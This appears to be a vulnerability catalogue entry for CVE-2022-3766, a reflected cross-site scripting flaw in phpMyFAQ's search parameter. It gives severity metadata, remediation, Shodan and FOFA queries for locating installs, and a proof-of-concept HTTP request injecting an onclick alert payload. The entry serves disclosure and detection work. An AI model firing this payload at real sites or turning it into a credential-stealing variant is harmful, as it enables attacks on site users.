---
layout: post
cve_id: CVE-2022-3766
title: phpMyFAQ < 3.1.8 - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2022/CVE-2022-3766.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-3766.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: medium
impact: 'An attacker can Execute arbitrary JavaScript in victim''s browser context

  '
remediation: 'Upgrade phpMyFAQ to version 3.1.8 or later

  '
reference:
- https://huntr.dev/bounties/d9666520-4ff5-43bb-aacf-50c8e5570983
- https://github.com/thorsten/phpMyFAQ/commit/c7904f2236c6c0dd64c2226b90c30af0f7e5a72d
- https://nvd.nist.gov/vuln/detail/CVE-2022-3766
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2022-3766
  cwe-id: CWE-79
  epss-score: 0.04657
  epss-percentile: 0.8898
  cpe: cpe:2.3:a:phpmyfaq:phpmyfaq:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  verified: true
  vendor: phpmyfaq
  product: phpmyfaq
  shodan-query: http.html:"phpmyfaq"
  fofa-query: body="phpmyfaq"
tags:
- cve
- cve2022
- phpmyfaq
- xss
- vuln
---

## ðŸ” Vulnerability Description
phpMyFAQ versions prior to 3.1.8 contain a reflected cross-site scripting vulnerability in the search functionality. The application fails to properly sanitize user input in the search parameter, allowing attackers to inject and execute malicious JavaScript code in the context of other users' browsers.


## ðŸŒ HTTP Request
```nohighlight
GET /index.php?search=1af%22+onclick%3D'alert(document.domain)' HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

